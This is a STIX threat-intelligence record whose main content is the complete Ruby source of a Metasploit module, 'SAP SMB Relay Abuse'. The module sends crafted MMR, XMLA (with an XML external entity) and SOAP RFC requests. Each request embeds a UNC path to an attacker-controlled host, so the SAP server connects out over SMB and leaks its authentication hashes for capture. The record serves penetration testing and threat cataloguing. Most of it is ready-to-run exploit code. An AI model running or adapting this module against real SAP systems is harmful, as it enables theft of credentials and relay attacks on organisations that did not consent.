{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--52cfe7b3-a3d6-4540-a8e4-26675f3a34df",
    "created": "2024-08-14T16:26:58.125795Z",
    "modified": "2024-08-14T16:26:58.1258Z",
    "name": "SAP SMB Relay Abuse",
    "description": " This module exploits provides several SMB Relay abuse through different SAP services and functions. The attack is done through specially crafted requests including a UNC Path which will be accessing by the SAP system while trying to process the request.  In order to get the hashes the auxiliary/server/capture/smb module can be used.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/sap/sap_smb_relay.rb",
            "external_id": "sap_smb_relay.rb"
        },
        {
            "source_name": "reference",
            "url": "https://launchpad.support.sap.com/#/notes/1597066"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n##\n# This module is based on, inspired by, or is a port of a plugin available in\n# the Onapsis Bizploit Opensource ERP Penetration Testing framework -\n# http://www.onapsis.com/research-free-solutions.php.\n# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts\n# in producing the Metasploit modules and was happy to share his knowledge and\n# experience - a very cool guy.\n#\n# The following guys from ERP-SCAN deserve credit for their contributions -\n# Alexandr Polyakov, Alexey Sintsov, Alexey Tyurin, Dmitry Chastukhin and\n# Dmitry Evdokimov.\n#\n# I'd also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis\n# who have Beta tested the modules and provided excellent feedback. Some people\n# just seem to enjoy hacking SAP :)\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name' => 'SAP SMB Relay Abuse',\n      'Description' => %q{\n          This module exploits provides several SMB Relay abuse through different SAP\n        services and functions. The attack is done through specially crafted requests\n        including a UNC Path which will be accessing by the SAP system while trying to\n        process the request.  In order to get the hashes the auxiliary/server/capture/smb\n        module can be used.\n      },\n      'References' => [\n        [ 'URL', 'http://erpscan.com/advisories/dsecrg-12-033-sap-basis-6-407-02-xml-external-entity/' ],\n        [ 'URL', 'https://launchpad.support.sap.com/#/notes/1597066' ]\n      ],\n      'Author' =>\n        [\n          'Alexey Tyurin', # xmla service SMB relay abuse discovery\n          'nmonkee' # Metasploit module\n        ],\n      'License' => MSF_LICENSE\n    )\n\n    register_options([\n      Opt::RPORT(8000),\n      OptString.new('CLIENT',   [true,  'SAP client', '001']),\n      OptString.new('HttpUsername', [false, 'Username (Ex SAP*)']),\n      OptString.new('HttpPassword', [false, 'Password (Ex 06071992)']),\n      OptAddressLocal.new('LHOST',   [true,  'Server IP or hostname of the SMB Capture system']),\n      OptEnum.new('ABUSE',      [true,  'SMB Relay abuse to use', \"MMR\",\n        [\n          \"MMR\",\n          \"BW\",\n          \"CLBA_CLASSIF_FILE_REMOTE_HOST\",\n          \"CLBA_UPDATE_FILE_REMOTE_HOST\"\n        ]\n      ]),\n    ])\n\n  end\n\n  def valid_credentials?\n    if datastore['HttpUsername'].blank?\n      return false\n    end\n\n    if datastore['HttpPassword'].blank?\n      return false\n    end\n    return true\n  end\n\n  def run_xmla\n\n    if not valid_credentials?\n      vprint_error(\"#{rhost}:#{rport} - Credentials needed in order to abuse the SAP BW service\")\n      return\n    end\n\n    smb_uri = \"\\\\\\\\#{datastore['LHOST']}\\\\#{Rex::Text.rand_text_alpha_lower(7)}.#{Rex::Text.rand_text_alpha_lower(3)}\"\n    data = '<?xml version=\"1.0\" encoding=\"utf-8\" ?>'\n    data << '<!DOCTYPE root ['\n    data << '<!ENTITY foo SYSTEM \"' + smb_uri + '\">'\n    data << ']>'\n    data << '<in>&foo;</in>'\n\n    begin\n      print_status(\"#{rhost}:#{rport} - Sending request for #{smb_uri}\")\n      res = send_request_raw({\n        'uri' => '/sap/bw/xml/soap/xmla?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',\n        'method' => 'POST',\n        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),\n        'data' => data,\n        'ctype' => 'text/xml; charset=UTF-8',\n        'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT']\n      })\n      if res and res.code == 200 and res.body =~ /XML for Analysis Provider/ and res.body =~ /Request transfered is not a valid XML/\n        print_good(\"#{rhost}:#{rport} - SMB Relay looks successful, check your SMB capture machine\")\n      else\n        vprint_status(\"#{rhost}:#{rport} - Response: #{res.code} - #{res.message}\") if res\n      end\n    rescue ::Rex::ConnectionError\n      print_error(\"#{rhost}:#{rport} - Unable to connect\")\n      return\n    end\n  end\n\n  def run_mmr\n    begin\n      smb_uri = \"\\\\\\\\#{datastore['LHOST']}\\\\#{Rex::Text.rand_text_alpha_lower(7)}.#{Rex::Text.rand_text_alpha_lower(3)}\"\n\n      if datastore['HttpUsername'].empty?\n        vprint_status(\"#{rhost}:#{rport} - Sending unauthenticated request for #{smb_uri}\")\n        res = send_request_cgi({\n          'uri' => '/mmr/MMR',\n          'method' => 'HEAD',\n          'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],\n          'ctype' => 'text/xml; charset=UTF-8',\n          'vars_get' => {\n            'sap-client' => datastore['CLIENT'],\n            'sap-language' => 'EN',\n            'filename' => smb_uri\n          }\n        })\n\n      else\n        vprint_status(\"#{rhost}:#{rport} - Sending authenticated request for #{smb_uri}\")\n        res = send_request_cgi({\n          'uri' => '/mmr/MMR',\n          'method' => 'GET',\n          'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),\n          'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],\n          'ctype' => 'text/xml; charset=UTF-8',\n          'vars_get' => {\n            'sap-client' => datastore['CLIENT'],\n            'sap-language' => 'EN',\n            'filename' => smb_uri\n          }\n        })\n      end\n\n      if res\n        vprint_status(\"#{rhost}:#{rport} - Response: #{res.code} - #{res.message}\")\n      end\n    rescue ::Rex::ConnectionError\n      print_error(\"#{rhost}:#{rport} - Unable to connect\")\n      return\n    end\n  end\n\n  def send_soap_rfc_request(data, smb_uri)\n    if not valid_credentials?\n      vprint_error(\"#{rhost}:#{rport} - Credentials needed in order to abuse the SAP SOAP RFC service\")\n      return\n    end\n\n    begin\n      vprint_status(\"#{rhost}:#{rport} - Sending request for #{smb_uri}\")\n      res = send_request_cgi({\n        'uri' => '/sap/bc/soap/rfc',\n        'method' => 'POST',\n        'data' => data,\n        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),\n        'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],\n        'ctype' => 'text/xml; charset=UTF-8',\n        'headers' => {\n          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',\n        },\n        'vars_get' => {\n          'sap-client' => datastore['CLIENT'],\n          'sap-language' => 'EN'\n        }\n      })\n      if res and res.code == 500 and res.body =~ /OPEN_FAILURE/\n        print_good(\"#{rhost}:#{rport} - SMB Relay looks successful, check your SMB capture machine\")\n      else\n        vprint_status(\"#{rhost}:#{rport} - Response: #{res.code} - #{res.message}\") if res\n      end\n    rescue ::Rex::ConnectionError\n      print_error(\"#{rhost}:#{rport} - Unable to connect\")\n      return\n    end\n  end\n\n  def run_clba_classif_file_remote\n    smb_uri = \"\\\\\\\\#{datastore['LHOST']}\\\\#{Rex::Text.rand_text_alpha_lower(7)}.#{Rex::Text.rand_text_alpha_lower(3)}\"\n\n    data = '<?xml version=\"1.0\" encoding=\"utf-8\" ?>'\n    data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:soap=\"http://schemas.xmlsoap.org/wsdl/soap/\" '\n    data << 'xmlns:xsd=\"http://www.w3.org/1999/XMLSchema\" xmlns:xsi=\"http://www.w3.org/1999/XMLSchema-instance\" xmlns:m0=\"http://tempuri.org/\" '\n    data << 'xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\">'\n    data << '<SOAP-ENV:Header/>'\n    data << '<SOAP-ENV:Body>'\n    data << '<CLBA_CLASSIF_FILE_REMOTE_HOST xmlns=\"urn:sap-com:document:sap:rfc:functions\">'\n    data << '<CLASSIF_FILE>'\n    data << '<item>'\n    data << '<ZEILE>a</ZEILE>'\n    data << '</item>'\n    data << '</CLASSIF_FILE>'\n    data << '<FILE_NAME>' + smb_uri + '</FILE_NAME>'\n    data << '</CLBA_CLASSIF_FILE_REMOTE_HOST>'\n    data << '</SOAP-ENV:Body>'\n    data << '</SOAP-ENV:Envelope>'\n    send_soap_rfc_request(data, smb_uri)\n  end\n\n  def run_clba_update_file_remote\n    smb_uri = \"\\\\\\\\#{datastore['LHOST']}\\\\#{Rex::Text.rand_text_alpha_lower(7)}.#{Rex::Text.rand_text_alpha_lower(3)}\"\n\n    data = '<?xml version=\"1.0\" encoding=\"utf-8\" ?>'\n    data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:soap=\"http://schemas.xmlsoap.org/wsdl/soap/\" '\n    data << 'xmlns:xsd=\"http://www.w3.org/1999/XMLSchema\" xmlns:xsi=\"http://www.w3.org/1999/XMLSchema-instance\" xmlns:m0=\"http://tempuri.org/\" '\n    data << 'xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\">'\n    data << '<SOAP-ENV:Header/>'\n    data << '<SOAP-ENV:Body>'\n    data << '<CLBA_UPDATE_FILE_REMOTE_HOST xmlns=\"urn:sap-com:document:sap:rfc:functions\">'\n    data << '<DATA_TAB>'\n    data << '<item>'\n    data << '<TABNAME>a</TABNAME>'\n    data << '<NUMMER>0</NUMMER>'\n    data << '<TEXT>a</TEXT>'\n    data << '<COLOR>a</COLOR>'\n    data << '<DATA>a</DATA>'\n    data << '</item>'\n    data << '</DATA_TAB>'\n    data << '<FILE_NAME>' + smb_uri + '</FILE_NAME>'\n    data << '</CLBA_UPDATE_FILE_REMOTE_HOST>'\n    data << '</SOAP-ENV:Body>'\n    data << '</SOAP-ENV:Envelope>'\n    send_soap_rfc_request(data, smb_uri)\n  end\n\n  def run_host(ip)\n    case datastore['ABUSE']\n      when \"MMR\"\n        run_mmr\n      when \"BW\"\n        run_xmla\n      when \"CLBA_CLASSIF_FILE_REMOTE_HOST\"\n        run_clba_classif_file_remote\n      when \"CLBA_UPDATE_FILE_REMOTE_HOST\"\n        run_clba_update_file_remote\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}